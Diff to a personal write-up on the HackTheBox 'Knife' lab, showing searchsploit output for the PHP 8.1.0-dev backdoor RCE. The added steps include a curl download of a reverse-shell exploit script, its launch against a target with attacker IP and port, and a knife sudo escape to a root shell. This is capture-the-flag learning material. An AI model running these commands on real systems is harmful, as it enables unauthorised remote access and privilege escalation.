@@ -100,8 +100,10 @@ Content-Type: text/html; charset=UTF-8
 ```
 
 - searching searchsploit for php/8.1.0-dev
+	- susceptible to RCE
+
 ```bash
-┌──(kali㉿kali)-[~]                                                                                                                             
+┌──(kali㉿kali)-[~]                                                                  
 └─$ searchsploit php 8.1.0-dev                                                                                                                  
 -------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                |  Path                           
@@ -110,7 +112,7 @@ Content-Type: text/html; charset=UTF-8
 PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                           | php/webapps/49933.py
 ...
 
-┌──(kali㉿kali)-[~/htb/knife]                                                                                                                   
+┌──(kali㉿kali)-[~/htb/knife]                                                     
 └─$ cat 49933.py                                                                                                                                
 # Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                            
 # Date: 23 may 2021                                                                                                                             
@@ -170,6 +172,20 @@ else:
 	- SearchSploit
 	- Metaspolit
 	- document
+
+- Searching GH for exploits reveals 
+- PHP 8.1.0-dev Backdoor Remote Code Execution
+	- [php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce?tab=readme-ov-file)
+	- `curl -O https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/refs/heads/main/revshell_php_8.1.0-dev.py`
+	- `python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>`
+		- spawns reverse shell
+		- into james user 
+			- cat user.txt
+- sudo -l reveals that james can run /usr/bin/knife as root
+- consulting gtfo bins https://gtfobins.github.io/gtfobins/knife/
+	- reveals it can be used to break out from restricted environments but spawning a interactive system shell. 
+		- `knife exec -E 'exec "/bin/sh"'`
+		- navigating to home to pull root.txt flag
 - Foothold
 	- sudo -l
 
